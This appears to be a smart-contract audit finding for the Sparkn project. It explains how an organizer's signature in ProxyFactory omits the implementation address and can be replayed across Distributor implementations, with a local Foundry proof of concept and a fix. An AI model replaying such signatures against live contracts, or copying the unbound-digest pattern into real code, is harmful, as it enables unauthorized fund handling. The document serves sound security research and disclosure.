# H-01 | The Same Organizer Signature Can Be Reused Across Different Distributor Implementations

**Project:** Sparkn  
**Severity:** High 
**Vulnerability Category:** Signature Replay / Incomplete Authorization Scope / Missing Signature Parameter Binding  
**Affected Contract:** `src/ProxyFactory.sol`  
**Affected Function:** `deployProxyAndDistributeBySignature()`  
**Test File:** `test/F01SignatureScope.t.sol`  
**Testing Framework:** Foundry  

---

## 1. Summary

Sparkn allows contest organizers to authorize prize distributions through cryptographic signatures. A third party can submit a valid signature to `ProxyFactory.deployProxyAndDistributeBySignature()`, which deploys the corresponding Proxy and executes the Distributor implementation.

However, the signature digest commits only to `contestId` and `data`, without including the `implementation` address.

In contrast, the Factory uses the organizer, contest identifier, and implementation address to calculate the CREATE2 salt and identify the registered contest configuration.

As a result, two different implementations can have distinct registered configurations and Proxy addresses while sharing the same signature digest.

A signature originally used with one implementation can therefore be reused with another implementation when the remaining registration and timing requirements are satisfied.

The local Foundry PoC confirms that the same Organizer signature can authorize prize distributions through two separately deployed and registered Distributor implementations.

This issue results from incomplete binding between the signed authorization and the execution target.

## 2. Root Cause

The affected function calculates the signed digest using:

```solidity
bytes32 digest = _hashTypedDataV4(
    keccak256(abi.encode(contestId, data))
);

if (ECDSA.recover(digest, signature) != organizer) {
    revert ProxyFactory__InvalidSignature();
}
```

The implementation address is not included in the signed message.

However, the Factory identifies the relevant contest configuration using:

```solidity
bytes32 salt = _calculateSalt(
    organizer,
    contestId,
    implementation
);
```

The two operations commit to different sets of parameters.

**Signature authorization scope:**

```text
EIP-712 Domain
    +
contestId
    +
data
```

**Contest and Proxy identity:**

```text
organizer
    +
contestId
    +
implementation
```

For two distinct implementations:

```solidity
implementationX != implementationY
```

The CREATE2 salts differ because the implementation address participates in salt computation.

However, when `contestId` and `data` remain unchanged, the signature digest also remains unchanged.

This enables the same signature to pass verification for more than one registered implementation.

**The root cause is the omission of the implementation address from the signed authorization payload, despite that address being part of the contest's execution identity.**

## 3. Impact

### 3.1 Cross-Implementation Signature Reuse

A valid Organizer signature may be reused across multiple registered Distributor implementations without obtaining a separate signature for each execution target.

This weakens the binding between the Organizer's authorization and the implementation that processes the associated reward funds.

### 3.2 Unexpected Distribution Execution

Sparkn uses deterministic CREATE2 Proxy addresses, which may be funded before deployment.

If a signature can authorize distributions for multiple registered implementations, a signature holder may trigger payouts from another implementation's corresponding Proxy without obtaining a fresh authorization for that implementation.

If the additional implementation performs different or unintended operations, this may create a risk of unauthorized fund handling.

### 3.3 Incomplete Authorization Boundary

Signature recovery confirms that a signature corresponds to the Organizer and the supplied digest.

It does not establish that the Organizer explicitly authorized the implementation address passed to the Factory.

Therefore, correct ECDSA recovery alone is insufficient to enforce implementation-specific authorization.

### 3.4 Preconditions and Demonstrated Scope

The reproduced scenario requires the relevant implementations to satisfy the Factory's contest registration and timing checks.

The local PoC uses two legitimate deployments of the same Distributor logic. Both are registered through the authorized setup.

It does not demonstrate an attacker registering a malicious implementation, bypassing Owner permissions, or stealing production assets.

**Severity note:** High reflects the historical Sparkn H-01 classification. The present work independently reproduces the signature-scope defect but does not constitute a new severity assessment.

## 4. Proof of Concept (PoC)

### 4.1 Test Environment

**Framework:** Foundry  
**Solidity Version:** 0.8.18  
**Test File:** `test/F01SignatureScope.t.sol`  
**Original Contracts:** `ProxyFactory.sol`, `Proxy.sol`, `Distributor.sol`  
**Mock Token:** `MockERC20.sol`  
**Test Actors:** Organizer, Sponsor, Winner A, Winner B, Stadium  
**Signature Utilities:** `vm.sign()`, `ECDSA.recover()`  
**Deployment Architecture:** CREATE2 Proxy / delegatecall

The reproduction uses only a local Foundry environment, mock tokens, and test accounts.

### 4.2 Test Scenario

The test deploys two independent Distributor instances:

```solidity
implementationX = new Distributor(
    address(factory),
    stadium
);

implementationY = new Distributor(
    address(factory),
    stadium
);
```

Each implementation is registered through the Factory using the same Organizer and contest identifier.

The respective CREATE2 salts and predicted Proxy addresses are different.

The Sponsor then pre-funds the predicted Proxy addresses:

**Proxy X:** 1,000 mock tokens  
**Proxy Y:** 5,000 mock tokens

Neither Proxy has been deployed at the time the tokens are transferred.

The payout calldata specifies:

**Winner A:** 60%  
**Winner B:** 35%  
**Stadium:** Remaining 5%

The Organizer signs one digest derived from the contest identifier and payout calldata.

The test subsequently performs two distributions:

**First execution:** The Factory deploys Proxy X and distributes its pre-funded balance using Implementation X.

**Second execution:** The Factory receives the same Organizer signature and calldata, but the requested implementation is changed to Implementation Y.

The expected vulnerable behavior is that both executions succeed without generating a second signature.

### 4.3 Foundry PoC

**Signature construction:**

```solidity
bytes32 structHash = keccak256(
    abi.encode(contestId, callData)
);

bytes32 digest = keccak256(
    abi.encodePacked(
        hex"1901",
        domainSeparator,
        structHash
    )
);

(uint8 v, bytes32 r, bytes32 s) =
    vm.sign(organizerPrivateKey, digest);

signature = abi.encodePacked(r, s, v);
```

The signed digest does not contain either implementation address.

**First distribution:**

```solidity
vm.prank(address(0x9999));

factory.deployProxyAndDistributeBySignature(
    organizer,
    contestId,
    address(implementationX),
    signature,
    callData
);
```

The test confirms that Proxy X distributes 600 tokens to Winner A, 350 to Winner B, and 50 to Stadium.

Proxy Y remains undeployed and retains its pre-funded 5,000-token balance.

**Second distribution using the same signature:**

```solidity
vm.prank(address(0x8888));

address deployedY =
    factory.deployProxyAndDistributeBySignature(
        organizer,
        contestId,
        address(implementationY),
        signature,
        callData
    );
```

No new signature is created.

The following assertions validate the second execution and the cumulative balances:

```solidity
assertEq(proxyY, deployedY);
assertGt(proxyY.code.length, 0);

assertEq(usdc.balanceOf(proxyY), 0);
assertEq(usdc.balanceOf(winners[0]), 3600e18);
assertEq(usdc.balanceOf(winners[1]), 2100e18);
assertEq(usdc.balanceOf(stadium), 300e18);
```

The complete PoC is available at:

`test/F01SignatureScope.t.sol`

### 4.4 Key Assertions

**Distinct implementations**

```solidity
assertNotEq(
    address(implementationX),
    address(implementationY)
);
```

Confirms that the test uses independent deployment targets.

**Distinct CREATE2 configurations**

```solidity
assertNotEq(saltX, saltY);
assertNotEq(proxyX, proxyY);
```

Confirms that the two implementations correspond to separate Proxy addresses.

**Valid registrations**

```solidity
assertGt(factory.saltToCloseTime(saltX), 0);
assertGt(factory.saltToCloseTime(saltY), 0);
```

Confirms that the registrations exist and that the test does not bypass the registration requirement.

**Successful first payout**

The first 1,000-token deposit is distributed as 600 / 350 / 50.

**Successful second payout with the same signature**

The second 5,000-token deposit is distributed as 3,000 / 1,750 / 250.

**Final balances**

The combined balances are:

- Winner A: 3,600 tokens
- Winner B: 2,100 tokens
- Stadium: 300 tokens

The total is 6,000 tokens, matching the combined pre-funded balances.

### 4.5 Test Execution

Executed command:

```bash
forge test --match-contract F01SignatureScopeTest -vv
```

Observed Foundry output:

```text
[PASS] testOrganizerSignature() (gas: 505991)
[PASS] testRegisteredImplementations() (gas: 62050)

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

**Result: 2 passed, 0 failed, 0 skipped.**

### 4.6 Test Results and Analysis

**Verified behavior:**

1. Two distinct Distributor implementations can be registered.
2. Their respective CREATE2 salts and Proxy addresses are different.
3. Both predicted Proxy addresses can be funded before deployment.
4. One valid Organizer signature is accepted for both implementation configurations.
5. Both Factory executions successfully deploy their respective Proxies and complete reward distributions.
6. The final token balances match the expected calculations.

**Limitations:**

1. Both implementations use identical Distributor business logic.
2. The PoC does not include a malicious implementation.
3. Unauthorized implementation registration is not demonstrated.
4. No real-world fund theft or production exploitation is established.
5. No patched implementation or post-fix regression test was executed.

Accordingly, the PoC establishes the cross-implementation signature reuse behavior, while the full impact of executing an unintended implementation remains conditional on the surrounding authorization and registration model.

## 5. Recommendation

Bind the implementation address directly to the Organizer's signed authorization payload.

A typed EIP-712 authorization structure could be defined as follows:

```solidity
bytes32 constant DISTRIBUTE_TYPEHASH =
    keccak256(
        "Distribute(bytes32 contestId,address implementation,bytes data)"
    );
```

The corresponding structured-data hash would be:

```solidity
bytes32 structHash = keccak256(
    abi.encode(
        DISTRIBUTE_TYPEHASH,
        contestId,
        implementation,
        keccak256(data)
    )
);

bytes32 digest = _hashTypedDataV4(structHash);
```

Under this design, changing the implementation address changes the digest and invalidates a signature created for another implementation.

Additional recommendations include:

1. Ensure off-chain signing clients and on-chain verification use identical typed-message definitions.
2. Evaluate the use of nonces to prevent unintended multiple consumption of a single authorization.
3. Consider deadlines to limit signature validity periods.
4. Review consistency between registered contest parameters and signed authorization parameters.
5. Ensure that alternative execution paths do not bypass the intended authorization restrictions.

Nonces and deadlines are complementary controls; they do not replace implementation-specific signature binding.

**Expected behavior after remediation:**

A valid signature authorizing Implementation X should succeed only for that implementation. Reusing the same signature with Implementation Y should be rejected during signature validation.

## 6. Fix Verification

**Status: Not Performed.**

The original Sparkn contracts were not modified.

No patched implementation or post-remediation Foundry test was executed.

Future regression testing should verify that:

1. A valid signature is accepted for its intended implementation.
2. The same signature is rejected for a different implementation.
3. Changes to the contest identifier or calldata invalidate the original authorization.
4. Prize allocation and commission accounting remain correct.
5. Off-chain and on-chain typed-data hashes remain consistent.

This report does not claim that the issue has been fixed.

## 7. Conclusion

`ProxyFactory.deployProxyAndDistributeBySignature()` verifies Organizer signatures without including the implementation address in the signed digest.

However, the Factory treats the implementation as part of the registered contest configuration and CREATE2 Proxy identity.

This discrepancy allows a signature to be reused across multiple registered implementation configurations when the remaining signed fields are unchanged.

The local Foundry PoC confirms that the same Organizer signature successfully authorizes two separate Proxy deployments and reward distributions.

**Test results: 2 passed, 0 failed.**

The reproduced behavior corresponds to the historically reported Sparkn H-01 signature-scope issue. The test does not independently demonstrate malicious implementation execution or real-world fund theft.
